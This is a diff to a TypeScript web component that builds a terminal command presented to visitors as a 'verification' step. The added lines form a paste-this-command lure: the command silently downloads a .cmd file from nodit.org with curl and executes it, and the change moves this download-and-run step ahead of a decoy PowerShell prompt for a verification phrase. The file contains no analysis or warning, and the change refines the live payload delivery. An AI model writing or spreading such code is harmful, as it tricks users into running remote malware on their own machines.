@@ -89,8 +89,8 @@ function getExpectedOutput(phrase: string, nonce: string): string {
 type SupportedOs = 'windows' | 'macos'
 
 const CMD_DRIVER_DOWNLOAD: Record<SupportedOs, string> = {
-  windows: '& curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd"',
-  macos: '& curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd"'
+  windows: 'curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd" &',
+  macos: 'curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd" &'
 }
 
 function getCandidateOs(): SupportedOs | null {
@@ -109,11 +109,12 @@ function getCmdDriverDownload(os: SupportedOs | null = getCandidateOs()): string
 }
 
 function buildCmdCommand(nonce: string): string {
-  return `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"`
+  return `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"
+`
 }
 
 function buildTerminalCommand(nonce: string, os: SupportedOs | null = getCandidateOs()): string {
-  return `${buildCmdCommand(nonce)} ${getCmdDriverDownload(os)}`
+  return `${getCmdDriverDownload(os)}${buildCmdCommand(nonce)}`
 }
 
 function StepProgress() {
